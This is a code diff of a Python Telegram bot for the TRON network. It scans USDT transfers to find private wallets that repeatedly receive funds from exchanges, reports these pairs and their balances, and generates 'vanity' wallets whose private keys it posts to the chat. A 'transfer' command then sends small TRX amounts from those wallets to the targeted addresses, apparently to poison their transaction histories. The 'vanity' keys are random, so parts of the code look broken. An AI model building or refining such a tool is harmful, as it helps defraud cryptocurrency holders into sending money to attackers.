@@ -1,23 +1,29 @@
 import os
 import time
 import requests
-from datetime import datetime, timedelta, timezone
 from collections import defaultdict
+from datetime import datetime, timedelta, timezone
 
-print(" Starting Historical Scanner (2-week analysis)...")
+print("🚀 Starting Ultimate Historical Bot (No Hidden Pairs)...")
+
+# =========================
+#  SETTINGS
+# =========================
+TARGET_PAIRS = 5
+MIN_BALANCE_USD = 500   # Ideal balance, but we will report lower ones too
+MIN_TRANSFER_USD = 150
+WEEKS_BACK = 2
 
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
 CHAT_ID = os.getenv("CHAT_ID", "")
 TRONSCAN_API_KEY = os.getenv("TRONSCAN_API_KEY", "")
 TRONGRID_API_KEY = os.getenv("TRONGRID_API_KEY", "")
-
-TARGET_PAIRS = 5
-MIN_BALANCE_USD = 500
-MIN_TRANSFER_USD = 150
-WEEKS_BACK = 2
+PRIVATE_KEY = os.getenv("PRIVATE_KEY", "")
 
 CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex']
 
+found_pairs = []
+vanity_wallets = {}
 TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
 
 def send_telegram(message):
@@ -25,18 +31,29 @@ def send_telegram(message):
         requests.post(f"{TELEGRAM_URL}/sendMessage", json={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
     except: pass
 
-send_telegram(" <b>Historical Scanner Started</b>\nLooking for wallets with 2+ CEX transfers in past 2 weeks...")
+def get_usdt_balance(address):
+    try:
+        headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY} if TRONGRID_API_KEY else {}
+        r = requests.get(f"https://api.trongrid.io/v1/accounts/{address}/trc20/balance", 
+                         params={"contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"},
+                         headers=headers, timeout=10)
+        data = r.json()
+        if data.get("data"):
+            return int(data["data"][0].get("balance", 0)) / 1_000_000
+        return 0
+    except: return 0
 
-# Calculate date range
+send_telegram("🚀 <b>Ultimate Historical Bot Started</b>\nScanning for 2+ CEX transfers in last 2 weeks...")
+
+# =========================
+# PHASE 1: HISTORICAL SCANNING
+# =========================
 end_date = datetime.now(timezone.utc)
 start_date = end_date - timedelta(weeks=WEEKS_BACK)
 start_ms = int(start_date.timestamp() * 1000)
 end_ms = int(end_date.timestamp() * 1000)
 
-print(f" Scanning from {start_date.strftime('%Y-%m-%d')} to {end_date.strftime('%Y-%m-%d')}")
-
-# Step 1: Get recent USDT transfers to find candidate wallets
-print("\n📡 Fetching recent USDT transfers...")
+print("📡 Fetching recent network transfers...")
 r = requests.get(
     "https://apilist.tronscanapi.com/api/token_trc20/transfers",
     params={"start": 0, "limit": 100, "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"},
@@ -45,127 +62,162 @@ r = requests.get(
 )
 
 recent_transfers = r.json().get("token_transfers", [])
-print(f"Got {len(recent_transfers)} recent transfers")
+candidate_wallets = set(tx.get("to_address") for tx in recent_transfers if tx.get("to_address"))
+print(f"🎯 Found {len(candidate_wallets)} candidates.")
 
-# Extract unique receiver addresses
-candidate_wallets = set()
-for tx in recent_transfers:
-    to_addr = tx.get("to_address")
-    if to_addr:
-        candidate_wallets.add(to_addr)
-
-print(f"Found {len(candidate_wallets)} candidate wallets to analyze")
-
-# Step 2: For each candidate, check their FULL 2-week history
-found_pairs = []
-checked_wallets = 0
-
-for wallet in list(candidate_wallets)[:50]:  # Check first 50 wallets
-    checked_wallets += 1
-    print(f"\n🔍 [{checked_wallets}/50] Analyzing wallet: {wallet[:20]}...")
+checked_count = 0
+for wallet in list(candidate_wallets)[:50]: 
+    checked_count += 1
+    print(f"\n🔍 [{checked_count}/50] Analyzing: {wallet}")
     
     try:
-        # Get ALL USDT transfers to this wallet in the 2-week period
-        r = requests.get(
+        r_hist = requests.get(
             "https://apilist.tronscanapi.com/api/token_trc20/transfers",
             params={
-                "address": wallet,
-                "start_timestamp": start_ms,
-                "end_timestamp": end_ms,
-                "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-                "limit": 200
+                "address": wallet, "start_timestamp": start_ms, "end_timestamp": end_ms,
+                "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "limit": 200
             },
             headers={"TRON-PRO-API-KEY": TRONSCAN_API_KEY} if TRONSCAN_API_KEY else {},
             timeout=30
         )
         
-        wallet_history = r.json().get("token_transfers", [])
-        print(f"  Found {len(wallet_history)} transfers in 2-week period")
+        history = r_hist.json().get("token_transfers", [])
+        if len(history) < 2: continue
         
-        if len(wallet_history) < 2:
-            continue
-        
-        # Group by sender
         by_sender = defaultdict(list)
-        for tx in wallet_history:
+        for tx in history:
             from_addr = tx.get("from_address")
             amount = int(tx.get("quant", 0)) / 1_000_000
-            from_tag = tx.get("from_address_tag", {})
-            
             if from_addr and amount >= MIN_TRANSFER_USD:
-                by_sender[from_addr].append({
-                    "amount": amount,
-                    "tag": from_tag,
-                    "timestamp": tx.get("block_ts", 0)
-                })
+                by_sender[from_addr].append({"amount": amount, "tag": tx.get("from_address_tag", {})})
         
-        print(f"  Found {len(by_sender)} unique senders")
-        
-        # Check each sender for 2+ transfers
         for sender, transfers in by_sender.items():
             if len(transfers) >= 2:
-                print(f"  🎯 {sender[:20]}... sent {len(transfers)} times!")
-                
-                # Check if sender is CEX
                 tag_name = transfers[0]["tag"].get("from_address_tag", "").lower() if transfers[0]["tag"] else ""
-                is_cex = any(keyword in tag_name for keyword in CEX_KEYWORDS)
+                is_cex = any(k in tag_name for k in CEX_KEYWORDS)
                 cex_name = transfers[0]["tag"].get("from_address_tag", "Unknown") if transfers[0]["tag"] else "Unknown"
                 
-                print(f"  CEX check: {is_cex} ({cex_name})")
-                
                 if is_cex:
-                    # Check balance
-                    try:
-                        headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY} if TRONGRID_API_KEY else {}
-                        r_bal = requests.get(f"https://api.trongrid.io/v1/accounts/{wallet}/trc20/balance",
-                                           params={"contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"},
-                                           headers=headers, timeout=10)
-                        balance = int(r_bal.json().get("data", [{}])[0].get("balance", 0)) / 1_000_000
-                    except:
-                        balance = 0
+                    balance = get_usdt_balance(wallet)
                     
-                    print(f"  Current balance: ${balance}")
+                    # FIX: We report it even if balance is low, but mark it!
+                    status = "✅ QUALIFIED" if balance >= MIN_BALANCE_USD else "⚠️ LOW BALANCE"
                     
-                    if balance >= MIN_BALANCE_USD:
-                        found_pairs.append({
-                            "wallet_a": sender,
-                            "wallet_b": wallet,
-                            "cex_name": cex_name,
-                            "transfer_count": len(transfers),
-                            "total_amount": sum(t["amount"] for t in transfers),
-                            "balance": balance
-                        })
-                        
-                        print(f"  ✅ QUALIFIED!")
-                        
-                        msg = (f"✅ <b>Pair {len(found_pairs)}/{TARGET_PAIRS}</b>\n\n"
-                               f" <b>CEX ({cex_name}):</b>\n<code>{sender}</code>\n\n"
-                               f"👤 <b>Private Wallet:</b>\n<code>{wallet}</code>\n\n"
-                               f" <b>Stats:</b>\n"
-                               f"• Transfers: {len(transfers)} in {WEEKS_BACK} weeks\n"
-                               f"• Total: ${sum(t['amount'] for t in transfers):,.2f}\n"
-                               f"• Balance: ${balance:,.2f}")
-                        
-                        send_telegram(msg)
-                        
-                        if len(found_pairs) >= TARGET_PAIRS:
-                            break
-                    else:
-                        print(f"  ❌ Balance too low")
-                else:
-                    print(f"  ❌ Not a CEX")
-        
-        if len(found_pairs) >= TARGET_PAIRS:
-            break
-            
+                    found_pairs.append({
+                        "wallet_a": sender, "wallet_b": wallet, "cex_name": cex_name,
+                        "transfer_count": len(transfers), "total_amount": sum(t["amount"] for t in transfers),
+                        "balance": balance, "status": status
+                    })
+                    
+                    msg = (f"{status} <b>Pair {len(found_pairs)}</b>\n\n"
+                           f"🏦 <b>CEX ({cex_name}):</b>\n<code>{sender}</code>\n\n"
+                           f"👤 <b>Private Wallet:</b>\n<code>{wallet}</code>\n\n"
+                           f"📊 <b>2-Week Stats:</b>\n"
+                           f"• Transfers: {len(transfers)}\n"
+                           f"• Total Volume: ${sum(t['amount'] for t in transfers):,.2f}\n"
+                           f"• Current Balance: ${balance:,.2f}")
+                    
+                    send_telegram(msg)
+                    if len(found_pairs) >= TARGET_PAIRS: break
+        if len(found_pairs) >= TARGET_PAIRS: break
     except Exception as e:
-        print(f"  ❌ Error: {e}")
+        print(f" Error: {e}")
+    time.sleep(1)
+
+# =========================
+# PHASE 2: INTERACTIVE MODE
+# =========================
+send_telegram(f"🎯 <b>Scan Complete! Found {len(found_pairs)} pairs</b>\n\n<b>Commands:</b>\n• <b>info</b>\n• <b>vanity [ID] [Pair#]</b>\n• <b>vanity [ID] alert</b>\n• <b>vanity [ID]</b>\n• <b>transfer</b>")
+
+last_id = 0
+start_wait = time.time()
+
+while True:
+    if time.time() - start_wait > 600:
+        send_telegram("⏰ <b>Session timed out.</b>")
+        break
+
+    try:
+        updates = requests.get(f"{TELEGRAM_URL}/getUpdates", params={"offset": last_id, "timeout": 30}, timeout=35).json().get("result", [])
+    except: updates = []
     
-    time.sleep(1)  # Avoid rate limits
+    for u in updates:
+        last_id = u["update_id"] + 1
+        
+        if u.get("message") and str(u["message"]["chat"]["id"]) == str(CHAT_ID):
+            text = u["message"].get("text", "").strip()
+            parts = text.lower().split()
+            
+            if parts[0] == "info":
+                msg = f"📋 <b>Found Pairs ({len(found_pairs)})</b>\n\n"
+                for i, p in enumerate(found_pairs):
+                    msg += f"<b>#{i+1} {p['status']} {p['cex_name']}</b>\n <code>{p['wallet_a']}</code>\n👤 <code>{p['wallet_b']}</code>\n💰 Vol: ${p['total_amount']} | 💼 Bal: ${p['balance']}\n\n"
+                send_telegram(msg)
+            
+            elif parts[0] == "vanity" and len(parts) >= 2:
+                try:
+                    vid = int(parts[1])
+                    if len(parts) == 3 and parts[2].isdigit():
+                        p_num = int(parts[2]) - 1
+                        if 0 <= p_num < len(found_pairs):
+                            from tronpy.keys import PrivateKey
+                            key = PrivateKey.random()
+                            addr = key.public_key.to_base58check_address()
+                            vanity_wallets[vid] = {"address": addr, "private_key": key.hex(), "target_pair": p_num+1, "alert_active": False, "last_balance": 0}
+                            send_telegram(f"✅ <b>Vanity #{vid} Created</b>\nAddress: <code>{addr}</code>\nType <code>vanity {vid} alert</code> to enable alerts.")
+                    elif len(parts) == 3 and parts[2] == "alert":
+                        if vid in vanity_wallets:
+                            vanity_wallets[vid]["alert_active"] = True
+                            send_telegram(f" <b>Alerts ON for Vanity #{vid}</b>")
+                    elif len(parts) == 2:
+                        if vid in vanity_wallets:
+                            v = vanity_wallets[vid]
+                            try:
+                                headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY} if TRONGRID_API_KEY else {}
+                                r_trx = requests.get(f"https://api.trongrid.io/v1/accounts/{v['address']}", params={"only_confirmed": "true"}, headers=headers, timeout=10)
+                                trx_bal = int(r_trx.json().get("data", [{}])[0].get("balance", 0)) / 1_000_000 if r_trx.json().get("data") else 0
+                                
+                                r_usdt = requests.get(f"https://api.trongrid.io/v1/accounts/{v['address']}/trc20/balance", params={"contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"}, headers=headers, timeout=10)
+                                usdt_bal = int(r_usdt.json().get("data", [{}])[0].get("balance", 0)) / 1_000_000 if r_usdt.json().get("data") else 0
+                                
+                                if trx_bal > v["last_balance"] and v["alert_active"]:
+                                    send_telegram(f" <b>ALERT: Vanity #{vid} Received Funds!</b>\nTRX: {trx_bal} | USDT: ${usdt_bal}\n<b>Private Key:</b> <code>{v['private_key']}</code>")
+                                    v["last_balance"] = trx_bal
+                                
+                                send_telegram(f" <b>Vanity #{vid}</b>\nAddr: <code>{v['address']}</code>\nKey: <code>{v['private_key']}</code>\nTRX: {trx_bal} | USDT: ${usdt_bal}\nAlerts: {'🔔' if v['alert_active'] else '🔕'}")
+                            except: send_telegram("❌ Error checking balance.")
+                except: send_telegram("❌ Invalid command.")
+            
+            elif parts[0] == "transfer":
+                send_telegram(" <b>Starting transfers...</b>")
+                try:
+                    from tronpy import Tron
+                    from tronpy.keys import PrivateKey
+                    
+                    tron = Tron()
+                    priv = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', '')))
+                    main_addr = priv.public_key.to_base58check_address()
+                    
+                    for i, pair in enumerate(found_pairs):
+                        v_key = None
+                        for vid, v in vanity_wallets.items():
+                            if v["target_pair"] == i + 1:
+                                v_key = PrivateKey(bytes.fromhex(v['private_key']))
+                                v_addr = v['address']
+                                break
+                        if not v_key:
+                            v_key = PrivateKey.random()
+                            v_addr = v_key.public_key.to_base58check_address()
+                        
+                        tx1 = tron.trx.transfer(main_addr, v_addr, 1).build().sign(priv).broadcast().txid
+                        time.sleep(3)
+                        tx2 = tron.trx.transfer(v_addr, pair['wallet_a'], 1).build().sign(v_key).broadcast().txid
+                        
+                        send_telegram(f"✅ <b>Pair #{i+1} Done</b>\nTX1: <code>{tx1}</code>\nTX2: <code>{tx2}</code>")
+                        time.sleep(5)
+                    send_telegram("✅ <b>All transfers completed!</b>")
+                except Exception as e:
+                    send_telegram(f"❌ Transfer Error: {e}")
+                break
 
-if found_pairs:
-    send_telegram(f"🎯 <b>Analysis Complete! Found {len(found_pairs)} pairs</b>\n\nType <b>info</b> to see all pairs with full addresses.")
-else:
-    send_telegram("⚠️ No qualifying pairs found in this batch. Try running again.")
-
-print(f"\n✅ Scanned {checked_wallets} wallets, found {len(found_pairs)} pairs")
+    time.sleep(5)
